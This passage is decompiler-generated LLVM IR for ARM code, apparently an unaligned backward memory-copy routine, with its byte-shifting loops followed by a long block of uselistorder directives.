dec_label_pc_169e8:                               ; preds = %dec_label_pc_169dc, %dec_label_pc_1699c, %dec_label_pc_169e8
  %v1_169f4 = phi i32 [ %v5_169f4, %dec_label_pc_169e8 ], [ %v1_169d0, %dec_label_pc_169dc ], [ %v0_169d019, %dec_label_pc_1699c ]
  %v0_169e8 = load i32, i32* @r3, align 4
  %v3_169e8 = mul i32 %v0_169e8, 256
  store i32 %v3_169e8, i32* %ip.global-to-local, align 4
  %v0_169ec = load i32, i32* %r1.global-to-local, align 4
  %v1_169ec = add i32 %v0_169ec, -4
  %v2_169ec = inttoptr i32 %v1_169ec to i32*
  %v3_169ec = load i32, i32* %v2_169ec, align 4
  store i32 %v3_169ec, i32* @r3, align 4
  store i32 %v1_169ec, i32* %r1.global-to-local, align 4
  %v4_169f0 = udiv i32 %v3_169ec, 16777216
  %v5_169f0 = or i32 %v4_169f0, %v3_169e8
  store i32 %v5_169f0, i32* @ip, align 4
  %v2_169f4 = add i32 %v1_169f4, -4
  %v3_169f4 = inttoptr i32 %v2_169f4 to i32*
  store i32 %v5_169f0, i32* %v3_169f4, align 4
  %v4_169f4 = load i32, i32* %r0.global-to-local, align 4
  %v5_169f4 = add i32 %v4_169f4, -4
  store i32 %v5_169f4, i32* %r0.global-to-local, align 4
  %v0_169f8 = load i32, i32* %r2.global-to-local, align 4
  %v2_169f8 = add i32 %v0_169f8, -4
  store i32 %v2_169f8, i32* %r2.global-to-local, align 4
  %v6_169fc = icmp slt i32 %v0_169f8, 4
  br i1 %v6_169fc, label %dec_label_pc_16a00.loopexit, label %dec_label_pc_169e8

dec_label_pc_16a00.loopexit:                      ; preds = %dec_label_pc_169e8
  %v4_169f8 = sub i32 3, %v0_169f8
  %v5_169f8 = and i32 %v4_169f8, %v0_169f8
  %v6_169f8 = icmp slt i32 %v5_169f8, 0
  %v7_169f8 = icmp slt i32 %v2_169f8, 0
  store i1 %v6_169f8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_169f8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16a00

dec_label_pc_16a00:                               ; preds = %dec_label_pc_16a00.loopexit, %dec_label_pc_169dc
  %v2_1694451 = phi i32 [ %v5_169f4, %dec_label_pc_16a00.loopexit ], [ %v1_169d0, %dec_label_pc_169dc ]
  %v0_1693447 = phi i32 [ %v2_169f8, %dec_label_pc_16a00.loopexit ], [ %v2_169e0, %dec_label_pc_169dc ]
  %v0_16a00 = load i32, i32* %r1.global-to-local, align 4
  %v1_16a00 = add i32 %v0_16a00, 3
  store i32 %v1_16a00, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_16a08:                               ; preds = %dec_label_pc_16998
  br i1 %v5_16a78, label %dec_label_pc_16a54, label %dec_label_pc_16a10

dec_label_pc_16a10:                               ; preds = %dec_label_pc_16a08
  store i32 %v2_16a74, i32* %r2.global-to-local, align 4
  %v3_16a14 = load i32, i32* @r4, align 4
  store i32 %v3_16a14, i32* %stack_var_-12, align 4
  %v6_16a14 = load i32, i32* @r5, align 4
  %v8_16a14 = inttoptr i32 %v6_16a14 to i8*
  store i8* %v8_16a14, i8** %stack_var_-8, align 4
  %v11_16a14 = load i32, i32* @lr, align 4
  br label %dec_label_pc_16a18

dec_label_pc_16a18:                               ; preds = %dec_label_pc_16a18.dec_label_pc_16a18_crit_edge, %dec_label_pc_16a10
  %v0_16a3c = phi i32 [ %v1_16a3c, %dec_label_pc_16a18.dec_label_pc_16a18_crit_edge ], [ %v0_169d019, %dec_label_pc_16a10 ]
  %v0_16a1c = phi i32 [ %v0_16a1c.pre, %dec_label_pc_16a18.dec_label_pc_16a18_crit_edge ], [ %v1_16988, %dec_label_pc_16a10 ]
  %v0_16a18 = phi i32 [ %v0_16a18.pre, %dec_label_pc_16a18.dec_label_pc_16a18_crit_edge ], [ %v2_1698c, %dec_label_pc_16a10 ]
  %v3_16a18 = mul i32 %v0_16a18, 65536
  store i32 %v3_16a18, i32* %lr.global-to-local, align 4
  %v1_16a1c = add i32 %v0_16a1c, -4
  %v2_16a1c = inttoptr i32 %v1_16a1c to i32*
  %v3_16a1c = load i32, i32* %v2_16a1c, align 4
  store i32 %v3_16a1c, i32* @r3, align 4
  %v4_16a1c = add i32 %v0_16a1c, -8
  %v5_16a1c = inttoptr i32 %v4_16a1c to i32*
  %v6_16a1c = load i32, i32* %v5_16a1c, align 4
  store i32 %v6_16a1c, i32* %r4.global-to-local, align 4
  %v7_16a1c = add i32 %v0_16a1c, -12
  %v8_16a1c = inttoptr i32 %v7_16a1c to i32*
  %v9_16a1c = load i32, i32* %v8_16a1c, align 4
  store i32 %v9_16a1c, i32* %r5.global-to-local, align 4
  %v10_16a1c = add i32 %v0_16a1c, -16
  %v11_16a1c = inttoptr i32 %v10_16a1c to i32*
  %v12_16a1c = load i32, i32* %v11_16a1c, align 4
  store i32 %v10_16a1c, i32* %r1.global-to-local, align 4
  %v4_16a20 = udiv i32 %v12_16a1c, 65536
  %v5_16a20 = or i32 %v4_16a20, %v3_16a18
  store i32 %v5_16a20, i32* %lr.global-to-local, align 4
  %v3_16a24 = mul i32 %v12_16a1c, 65536
  %v4_16a28 = udiv i32 %v9_16a1c, 65536
  %v5_16a28 = or i32 %v3_16a24, %v4_16a28
  store i32 %v5_16a28, i32* @ip, align 4
  %v3_16a2c = mul i32 %v9_16a1c, 65536
  %v4_16a30 = udiv i32 %v6_16a1c, 65536
  %v5_16a30 = or i32 %v3_16a2c, %v4_16a30
  store i32 %v5_16a30, i32* %r5.global-to-local, align 4
  %v3_16a34 = mul i32 %v6_16a1c, 65536
  %v4_16a38 = udiv i32 %v3_16a1c, 65536
  %v5_16a38 = or i32 %v3_16a34, %v4_16a38
  store i32 %v5_16a38, i32* %r4.global-to-local, align 4
  %v1_16a3c = add i32 %v0_16a3c, -16
  %v2_16a3c = inttoptr i32 %v1_16a3c to i32*
  store i32 %v5_16a38, i32* %v2_16a3c, align 4
  %v4_16a3c = add i32 %v0_16a3c, -12
  %v5_16a3c = inttoptr i32 %v4_16a3c to i32*
  %v6_16a3c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_16a3c, i32* %v5_16a3c, align 4
  %v7_16a3c = add i32 %v0_16a3c, -8
  %v8_16a3c = inttoptr i32 %v7_16a3c to i32*
  %v9_16a3c = load i32, i32* @ip, align 4
  store i32 %v9_16a3c, i32* %v8_16a3c, align 4
  %v10_16a3c = add i32 %v0_16a3c, -4
  %v11_16a3c = inttoptr i32 %v10_16a3c to i32*
  %v12_16a3c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16a3c, i32* %v11_16a3c, align 4
  store i32 %v1_16a3c, i32* %r0.global-to-local, align 4
  %v0_16a40 = load i32, i32* %r2.global-to-local, align 4
  %v2_16a40 = add i32 %v0_16a40, -16
  store i32 %v2_16a40, i32* %r2.global-to-local, align 4
  %v6_16a44 = icmp slt i32 %v0_16a40, 16
  br i1 %v6_16a44, label %dec_label_pc_16a48, label %dec_label_pc_16a18.dec_label_pc_16a18_crit_edge

dec_label_pc_16a18.dec_label_pc_16a18_crit_edge:  ; preds = %dec_label_pc_16a18
  %v0_16a18.pre = load i32, i32* @r3, align 4
  %v0_16a1c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16a18

dec_label_pc_16a48:                               ; preds = %dec_label_pc_16a18
  %v2_16a48 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16a48, i32* @r4, align 4
  %v5_16a48 = load i8*, i8** %stack_var_-8, align 4
  %v6_16a48 = ptrtoint i8* %v5_16a48 to i32
  store i32 %v6_16a48, i32* @r5, align 4
  store i32 %v11_16a14, i32* @lr, align 4
  %v2_16a4c = add i32 %v0_16a40, -4
  store i32 %v2_16a4c, i32* %r2.global-to-local, align 4
  %v4_16a4c = add i32 %v0_16a40, 2147483632
  %v5_16a4c = and i32 %v2_16a4c, %v4_16a4c
  %v6_16a4c = icmp slt i32 %v5_16a4c, 0
  store i1 %v6_16a4c, i1* %cpsr_v.global-to-local, align 1
  %v7_16a4c = icmp slt i32 %v2_16a4c, 0
  store i1 %v7_16a4c, i1* %cpsr_n.global-to-local, align 1
  %v8_16a4c = icmp eq i32 %v2_16a4c, 0
  store i1 %v8_16a4c, i1* %cpsr_z.global-to-local, align 1
  %v5_16a50 = icmp slt i32 %v2_16a40, -12
  br i1 %v5_16a50, label %dec_label_pc_16a6c, label %dec_label_pc_16a54

dec_label_pc_16a54:                               ; preds = %dec_label_pc_16a48, %dec_label_pc_16a08, %dec_label_pc_16a54
  %v1_16a60 = phi i32 [ %v5_16a60, %dec_label_pc_16a54 ], [ %v1_16a3c, %dec_label_pc_16a48 ], [ %v0_169d019, %dec_label_pc_16a08 ]
  %v0_16a54 = load i32, i32* @r3, align 4
  %v3_16a54 = mul i32 %v0_16a54, 65536
  store i32 %v3_16a54, i32* %ip.global-to-local, align 4
  %v0_16a58 = load i32, i32* %r1.global-to-local, align 4
  %v1_16a58 = add i32 %v0_16a58, -4
  %v2_16a58 = inttoptr i32 %v1_16a58 to i32*
  %v3_16a58 = load i32, i32* %v2_16a58, align 4
  store i32 %v3_16a58, i32* @r3, align 4
  store i32 %v1_16a58, i32* %r1.global-to-local, align 4
  %v4_16a5c = udiv i32 %v3_16a58, 65536
  %v5_16a5c = or i32 %v4_16a5c, %v3_16a54
  store i32 %v5_16a5c, i32* @ip, align 4
  %v2_16a60 = add i32 %v1_16a60, -4
  %v3_16a60 = inttoptr i32 %v2_16a60 to i32*
  store i32 %v5_16a5c, i32* %v3_16a60, align 4
  %v4_16a60 = load i32, i32* %r0.global-to-local, align 4
  %v5_16a60 = add i32 %v4_16a60, -4
  store i32 %v5_16a60, i32* %r0.global-to-local, align 4
  %v0_16a64 = load i32, i32* %r2.global-to-local, align 4
  %v2_16a64 = add i32 %v0_16a64, -4
  store i32 %v2_16a64, i32* %r2.global-to-local, align 4
  %v6_16a68 = icmp slt i32 %v0_16a64, 4
  br i1 %v6_16a68, label %dec_label_pc_16a6c.loopexit, label %dec_label_pc_16a54

dec_label_pc_16a6c.loopexit:                      ; preds = %dec_label_pc_16a54
  %v4_16a64 = sub i32 3, %v0_16a64
  %v5_16a64 = and i32 %v4_16a64, %v0_16a64
  %v6_16a64 = icmp slt i32 %v5_16a64, 0
  %v7_16a64 = icmp slt i32 %v2_16a64, 0
  store i1 %v6_16a64, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16a64, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16a6c

dec_label_pc_16a6c:                               ; preds = %dec_label_pc_16a6c.loopexit, %dec_label_pc_16a48
  %v2_1694452 = phi i32 [ %v5_16a60, %dec_label_pc_16a6c.loopexit ], [ %v1_16a3c, %dec_label_pc_16a48 ]
  %v0_1693448 = phi i32 [ %v2_16a64, %dec_label_pc_16a6c.loopexit ], [ %v2_16a4c, %dec_label_pc_16a48 ]
  %v0_16a6c = load i32, i32* %r1.global-to-local, align 4
  %v1_16a6c = add i32 %v0_16a6c, 2
  store i32 %v1_16a6c, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_16a74:                               ; preds = %dec_label_pc_16988
  br i1 %v5_16a78, label %dec_label_pc_16ac0, label %dec_label_pc_16a7c

dec_label_pc_16a7c:                               ; preds = %dec_label_pc_16a74
  store i32 %v2_16a74, i32* %r2.global-to-local, align 4
  %v3_16a80 = load i32, i32* @r4, align 4
  store i32 %v3_16a80, i32* %stack_var_-12, align 4
  %v6_16a80 = load i32, i32* @r5, align 4
  %v8_16a80 = inttoptr i32 %v6_16a80 to i8*
  store i8* %v8_16a80, i8** %stack_var_-8, align 4
  %v11_16a80 = load i32, i32* @lr, align 4
  br label %dec_label_pc_16a84

dec_label_pc_16a84:                               ; preds = %dec_label_pc_16a84.dec_label_pc_16a84_crit_edge, %dec_label_pc_16a7c
  %v0_16aa8 = phi i32 [ %v1_16aa8, %dec_label_pc_16a84.dec_label_pc_16a84_crit_edge ], [ %v0_169d019, %dec_label_pc_16a7c ]
  %v0_16a88 = phi i32 [ %v0_16a88.pre, %dec_label_pc_16a84.dec_label_pc_16a84_crit_edge ], [ %v1_16988, %dec_label_pc_16a7c ]
  %v0_16a84 = phi i32 [ %v0_16a84.pre, %dec_label_pc_16a84.dec_label_pc_16a84_crit_edge ], [ %v2_1698c, %dec_label_pc_16a7c ]
  %v3_16a84 = mul i32 %v0_16a84, 16777216
  store i32 %v3_16a84, i32* %lr.global-to-local, align 4
  %v1_16a88 = add i32 %v0_16a88, -4
  %v2_16a88 = inttoptr i32 %v1_16a88 to i32*
  %v3_16a88 = load i32, i32* %v2_16a88, align 4
  store i32 %v3_16a88, i32* @r3, align 4
  %v4_16a88 = add i32 %v0_16a88, -8
  %v5_16a88 = inttoptr i32 %v4_16a88 to i32*
  %v6_16a88 = load i32, i32* %v5_16a88, align 4
  store i32 %v6_16a88, i32* %r4.global-to-local, align 4
  %v7_16a88 = add i32 %v0_16a88, -12
  %v8_16a88 = inttoptr i32 %v7_16a88 to i32*
  %v9_16a88 = load i32, i32* %v8_16a88, align 4
  store i32 %v9_16a88, i32* %r5.global-to-local, align 4
  %v10_16a88 = add i32 %v0_16a88, -16
  %v11_16a88 = inttoptr i32 %v10_16a88 to i32*
  %v12_16a88 = load i32, i32* %v11_16a88, align 4
  store i32 %v10_16a88, i32* %r1.global-to-local, align 4
  %v4_16a8c = udiv i32 %v12_16a88, 256
  %v5_16a8c = or i32 %v4_16a8c, %v3_16a84
  store i32 %v5_16a8c, i32* %lr.global-to-local, align 4
  %v3_16a90 = mul i32 %v12_16a88, 16777216
  %v4_16a94 = udiv i32 %v9_16a88, 256
  %v5_16a94 = or i32 %v3_16a90, %v4_16a94
  store i32 %v5_16a94, i32* @ip, align 4
  %v3_16a98 = mul i32 %v9_16a88, 16777216
  %v4_16a9c = udiv i32 %v6_16a88, 256
  %v5_16a9c = or i32 %v3_16a98, %v4_16a9c
  store i32 %v5_16a9c, i32* %r5.global-to-local, align 4
  %v3_16aa0 = mul i32 %v6_16a88, 16777216
  %v4_16aa4 = udiv i32 %v3_16a88, 256
  %v5_16aa4 = or i32 %v3_16aa0, %v4_16aa4
  store i32 %v5_16aa4, i32* %r4.global-to-local, align 4
  %v1_16aa8 = add i32 %v0_16aa8, -16
  %v2_16aa8 = inttoptr i32 %v1_16aa8 to i32*
  store i32 %v5_16aa4, i32* %v2_16aa8, align 4
  %v4_16aa8 = add i32 %v0_16aa8, -12
  %v5_16aa8 = inttoptr i32 %v4_16aa8 to i32*
  %v6_16aa8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_16aa8, i32* %v5_16aa8, align 4
  %v7_16aa8 = add i32 %v0_16aa8, -8
  %v8_16aa8 = inttoptr i32 %v7_16aa8 to i32*
  %v9_16aa8 = load i32, i32* @ip, align 4
  store i32 %v9_16aa8, i32* %v8_16aa8, align 4
  %v10_16aa8 = add i32 %v0_16aa8, -4
  %v11_16aa8 = inttoptr i32 %v10_16aa8 to i32*
  %v12_16aa8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16aa8, i32* %v11_16aa8, align 4
  store i32 %v1_16aa8, i32* %r0.global-to-local, align 4
  %v0_16aac = load i32, i32* %r2.global-to-local, align 4
  %v2_16aac = add i32 %v0_16aac, -16
  store i32 %v2_16aac, i32* %r2.global-to-local, align 4
  %v6_16ab0 = icmp slt i32 %v0_16aac, 16
  br i1 %v6_16ab0, label %dec_label_pc_16ab4, label %dec_label_pc_16a84.dec_label_pc_16a84_crit_edge

dec_label_pc_16a84.dec_label_pc_16a84_crit_edge:  ; preds = %dec_label_pc_16a84
  %v0_16a84.pre = load i32, i32* @r3, align 4
  %v0_16a88.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16a84

dec_label_pc_16ab4:                               ; preds = %dec_label_pc_16a84
  %v2_16ab4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16ab4, i32* @r4, align 4
  %v5_16ab4 = load i8*, i8** %stack_var_-8, align 4
  %v6_16ab4 = ptrtoint i8* %v5_16ab4 to i32
  store i32 %v6_16ab4, i32* @r5, align 4
  store i32 %v11_16a80, i32* @lr, align 4
  %v2_16ab8 = add i32 %v0_16aac, -4
  store i32 %v2_16ab8, i32* %r2.global-to-local, align 4
  %v4_16ab8 = add i32 %v0_16aac, 2147483632
  %v5_16ab8 = and i32 %v2_16ab8, %v4_16ab8
  %v6_16ab8 = icmp slt i32 %v5_16ab8, 0
  store i1 %v6_16ab8, i1* %cpsr_v.global-to-local, align 1
  %v7_16ab8 = icmp slt i32 %v2_16ab8, 0
  store i1 %v7_16ab8, i1* %cpsr_n.global-to-local, align 1
  %v8_16ab8 = icmp eq i32 %v2_16ab8, 0
  store i1 %v8_16ab8, i1* %cpsr_z.global-to-local, align 1
  %v5_16abc = icmp slt i32 %v2_16aac, -12
  br i1 %v5_16abc, label %dec_label_pc_16ad8, label %dec_label_pc_16ac0

dec_label_pc_16ac0:                               ; preds = %dec_label_pc_16ab4, %dec_label_pc_16a74, %dec_label_pc_16ac0
  %v1_16acc = phi i32 [ %v5_16acc, %dec_label_pc_16ac0 ], [ %v1_16aa8, %dec_label_pc_16ab4 ], [ %v0_169d019, %dec_label_pc_16a74 ]
  %v0_16ac0 = load i32, i32* @r3, align 4
  %v3_16ac0 = mul i32 %v0_16ac0, 16777216
  store i32 %v3_16ac0, i32* %ip.global-to-local, align 4
  %v0_16ac4 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ac4 = add i32 %v0_16ac4, -4
  %v2_16ac4 = inttoptr i32 %v1_16ac4 to i32*
  %v3_16ac4 = load i32, i32* %v2_16ac4, align 4
  store i32 %v3_16ac4, i32* @r3, align 4
  store i32 %v1_16ac4, i32* %r1.global-to-local, align 4
  %v4_16ac8 = udiv i32 %v3_16ac4, 256
  %v5_16ac8 = or i32 %v4_16ac8, %v3_16ac0
  store i32 %v5_16ac8, i32* @ip, align 4
  %v2_16acc = add i32 %v1_16acc, -4
  %v3_16acc = inttoptr i32 %v2_16acc to i32*
  store i32 %v5_16ac8, i32* %v3_16acc, align 4
  %v4_16acc = load i32, i32* %r0.global-to-local, align 4
  %v5_16acc = add i32 %v4_16acc, -4
  store i32 %v5_16acc, i32* %r0.global-to-local, align 4
  %v0_16ad0 = load i32, i32* %r2.global-to-local, align 4
  %v2_16ad0 = add i32 %v0_16ad0, -4
  store i32 %v2_16ad0, i32* %r2.global-to-local, align 4
  %v6_16ad4 = icmp slt i32 %v0_16ad0, 4
  br i1 %v6_16ad4, label %dec_label_pc_16ad8.loopexit, label %dec_label_pc_16ac0

dec_label_pc_16ad8.loopexit:                      ; preds = %dec_label_pc_16ac0
  %v4_16ad0 = sub i32 3, %v0_16ad0
  %v5_16ad0 = and i32 %v4_16ad0, %v0_16ad0
  %v6_16ad0 = icmp slt i32 %v5_16ad0, 0
  %v7_16ad0 = icmp slt i32 %v2_16ad0, 0
  store i1 %v6_16ad0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16ad0, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16ad8

dec_label_pc_16ad8:                               ; preds = %dec_label_pc_16ad8.loopexit, %dec_label_pc_16ab4
  %v2_1694453 = phi i32 [ %v5_16acc, %dec_label_pc_16ad8.loopexit ], [ %v1_16aa8, %dec_label_pc_16ab4 ]
  %v0_1693449 = phi i32 [ %v2_16ad0, %dec_label_pc_16ad8.loopexit ], [ %v2_16ab8, %dec_label_pc_16ab4 ]
  %v0_16ad8 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ad8 = add i32 %v0_16ad8, 1
  store i32 %v1_16ad8, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_16acc, { 0, 2, 1 }
  uselistorder i32 %v3_16ac0, { 1, 0 }
  uselistorder i32 %v2_16ab8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16aa8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_16a88, { 1, 0 }
  uselistorder i32 %v3_16a84, { 1, 0 }
  uselistorder i32 %v0_16a88, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16aa8, { 3, 2, 1, 0 }
  uselistorder i32 %v5_16a60, { 0, 2, 1 }
  uselistorder i32 %v3_16a54, { 1, 0 }
  uselistorder i32 %v2_16a4c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16a3c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_16a1c, { 1, 0 }
  uselistorder i32 %v3_16a18, { 1, 0 }
  uselistorder i32 %v0_16a1c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16a3c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_169f4, { 0, 2, 1 }
  uselistorder i32 %v3_169e8, { 1, 0 }
  uselistorder i32 %v2_169e0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_169d0, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_169b0, { 1, 0 }
  uselistorder i32 %v3_169ac, { 1, 0 }
  uselistorder i32 %v0_169b0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_169d0, { 3, 2, 1, 0 }
  uselistorder i1 %v5_16a78, { 2, 0, 1 }
  uselistorder i32 %v0_16990, { 1, 0 }
  uselistorder i32 %v0_16a7c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_169d019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_16980, { 2, 1, 0 }
  uselistorder i32 %v0_16980, { 2, 0, 1 }
  uselistorder i32 %v2_16978, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_16978, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16978, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_169d020, { 2, 1, 0 }
  uselistorder i32 %v11_16954, { 1, 0 }
  uselistorder i32 %v7_16954, { 1, 0 }
  uselistorder i32 %v1_16934, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_16934, { 1, 2, 0, 3 }
  uselistorder i32 %v2_16938, { 1, 0 }
  uselistorder i32 %v7_1692c, { 0, 2, 1 }
  uselistorder i32 %v10_16928, { 1, 0 }
  uselistorder i32 %v9_16920, { 1, 0, 2 }
  uselistorder i32 %v6_1691c, { 1, 0 }
  uselistorder i32 %v2_16914, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_16914, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_16924, { 0, 3, 2, 1 }
  uselistorder i32 %v7_16908, { 0, 2, 1 }
  uselistorder i32 %v13_16904, { 1, 0 }
  uselistorder i32 %v4_16900, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_16900, { 2, 0, 1 }
  uselistorder i32 %v6_16908, { 0, 3, 2, 1 }
  uselistorder i32 %v7_168f8, { 0, 2, 1 }
  uselistorder i32 %v16_168f4, { 1, 0 }
  uselistorder i32 %v4_168f0, { 1, 2, 0 }
  uselistorder i32 %v0_16900.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_168f8, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_168e4, { 0, 3, 2, 1 }
  uselistorder i32 %v10_168e0, { 1, 0 }
  uselistorder i32 %v1_168dc, { 1, 0 }
  uselistorder i32 %v10_168d8, { 1, 0 }
  uselistorder i32 %v0_168d8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_168dc, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_168d0, { 0, 2, 1 }
  uselistorder i32 %v2_168c4, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_168c4, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_168dc37, { 1, 2, 0 }
  uselistorder i32 %v1_168bc, { 2, 1, 0 }
  uselistorder i32 %v1_168b4, { 2, 3, 1, 0 }
  uselistorder i32 %v2_168ac, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_168a8, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_168a4, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_168a4, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_16894, { 0, 2, 1 }
  uselistorder i32 %v4_16890, { 1, 0 }
  uselistorder i32 %v3_16884, { 1, 0 }
  uselistorder i32 %v1_1687c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16870, { 1, 0 }
  uselistorder i32 %v12_1686c, { 0, 2, 1 }
  uselistorder i32 %v8_1684c, { 1, 0, 2 }
  uselistorder i32 %v5_1684c, { 1, 0, 2 }
  uselistorder i32 %v2_1684c, { 1, 0, 2 }
  uselistorder i32 %v0_1684c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1686c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_16828, { 0, 2, 1 }
  uselistorder i32 %v4_16824, { 1, 0 }
  uselistorder i32 %v3_16818, { 1, 0 }
  uselistorder i32 %v1_16810, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16804, { 1, 0 }
  uselistorder i32 %v12_16800, { 0, 2, 1 }
  uselistorder i32 %v8_167e0, { 1, 0, 2 }
  uselistorder i32 %v5_167e0, { 1, 0, 2 }
  uselistorder i32 %v2_167e0, { 1, 0, 2 }
  uselistorder i32 %v0_167e0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16800, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_167bc, { 0, 2, 1 }
  uselistorder i32 %v4_167b8, { 1, 0 }
  uselistorder i32 %v3_167ac, { 1, 0 }
  uselistorder i32 %v1_167a4, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16798, { 1, 0 }
  uselistorder i32 %v12_16794, { 0, 2, 1 }
  uselistorder i32 %v8_16774, { 1, 0, 2 }
  uselistorder i32 %v5_16774, { 1, 0, 2 }
  uselistorder i32 %v2_16774, { 1, 0, 2 }
  uselistorder i32 %v0_16774, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16794, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_167d0, { 0, 2, 1 }
  uselistorder i32 %v1_167cc, { 2, 0, 1, 3 }
  uselistorder i32 %v4_16750, { 2, 0, 1, 3 }
  uselistorder i32 %v2_16750, { 2, 0, 1, 3 }
  uselistorder i32 %v0_167d4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1686c76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_16744, { 1, 0 }
  uselistorder i32 %v0_16744, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1673c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1673c, { 1, 0, 2 }
  uselistorder i32 %v0_1673c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1686c77, { 1, 0 }
  uselistorder i32 %v1_1671c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_16724, { 1, 0 }
  uselistorder i32 %v0_166f8, { 3, 0, 1, 2 }
  uselistorder i32 %v1_166ec, { 1, 2, 0, 3 }
  uselistorder i32 %v5_166d8, { 1, 0, 2 }
  uselistorder i32 %v1_166d4, { 1, 0 }
  uselistorder i32 %v1_166cc, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_166cc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_166c4, { 0, 2, 1 }
  uselistorder i32 %v3_166c4, { 3, 0, 1, 2 }
  uselistorder i1 %v0_166c4, { 1, 0 }
  uselistorder i1 %v1_166c4, { 1, 0 }
  uselistorder i32 %v3_166c0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_166b8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_166a4, { 1, 2, 0 }
  uselistorder i32 %v1_1669c, { 0, 2, 1 }
  uselistorder i32 %v12_16698, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1668c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16690, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_16680, { 0, 2, 1 }
  uselistorder i32 %v1_16678, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_16678, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_16670, { 1, 0 }
  uselistorder i32 %v1_16668, { 2, 1, 0 }
  uselistorder i32 %v2_16660, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_16660, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_1665c, { 1, 0 }
  uselistorder i32 %v2_16650, { 1, 0 }
  uselistorder i32 %v1_16650, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_16650, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 31, 1, 2, 3, 4, 5, 32, 6, 7, 8, 9, 10, 33, 11, 12, 13, 14, 15, 34, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 35, 36, 68, 37, 38, 39, 40, 41, 69, 42, 43, 44, 45, 46, 70, 47, 48, 49, 50, 51, 71, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 72 }
